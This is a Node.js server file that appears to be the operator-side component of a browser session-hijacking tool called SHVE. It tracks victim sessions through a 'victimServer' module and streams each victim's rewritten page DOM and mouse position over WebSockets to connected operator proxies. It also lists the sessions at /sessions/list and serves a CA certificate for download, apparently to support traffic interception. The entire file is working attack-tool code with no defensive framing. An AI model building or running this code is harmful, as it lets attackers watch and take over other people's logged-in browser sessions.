const http = require('http');
const express = require('express');
const WebSocket = require('ws');
const cheerio = require('cheerio');
const url = require('url');
const { startServer: startVictimServer, getConnectedClients, startListening, stopListening } = require('./victimServer');

const app = express();
const path = require('path');
const port = 3000;

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const connectedClients = {};

function cleanHTML(html, baseURL) {
  if (!baseURL) {
    return html;
  }
  const $ = cheerio.load(html);
  $('img[src], script[src], link[href]').each((i, el) => {
    const $el = $(el);
    const src = $el.attr('src') || $el.attr('href');
    if (src && !src.match(/^(http|https|\/\/)/)) {
      const resolved = url.resolve(baseURL, src);
      $el.attr('src', resolved);
      $el.attr('href', resolved);
    }
  });
  return $.html();
}

function handleConnection(ws, req) {
  const shveHeader = req.headers['shve'];
  console.log(`New connection with SHVE header: ${shveHeader}`);

  if (shveHeader) {
    if (!connectedClients[shveHeader]) {
      startListening(shveHeader);
    }
    connectedClients[shveHeader] = ws;
  }
}

function handleDisconnection(ws, req) {
  const shveHeader = req.headers['shve'];
  console.log(`Connection with SHVE header ${shveHeader} closed`);

  if (shveHeader && connectedClients[shveHeader] === ws) {
    connectedClients[shveHeader] = null;
    if (!Object.values(connectedClients).some(client => client !== null && client !== ws)) {
      stopListening(shveHeader);
    }
  }
}

wss.on('connection', (ws, req) => {
  handleConnection(ws, req);

  ws.on('close', () => {
    handleDisconnection(ws, req);
  });
});

function writeDom(shve, data, baseURL) {
  const ws = connectedClients[shve];
  if (ws) {
    data = cleanHTML(data, baseURL)
    const message = JSON.stringify({ writeDom: { data } });
    ws.send(message);
  } else {
    console.log(`No proxy with shve ${shve} found`);
  }
}

function setMouse(shve, x, y) {
  const ws = connectedClients[shve];
  if (ws) {
    const message = JSON.stringify({ setMouse: { x, y } });
    ws.send(message);
  } else {
    console.log(`No proxy with shve ${shve} found`);
  }
}

app.get('/sessions/list', (req, res) => {
  const clients = getConnectedClients();
  res.json(clients);
});

app.get('/certificate/download', (req, res) => {
  const certPath = path.join(__dirname, 'certs/certs', 'ca.pem');

  res.download(certPath, 'cert.pem', (err) => {
    if (err) {
      console.error(err);
      res.status(500).send('Error al descargar el certificado');
    }
  });
});

module.exports = {
  startServer: () => {
    server.listen(port, () => {
      console.log(`Server running on http://localhost:${port}`);
    });
  },
  writeDom,
  setMouse,
};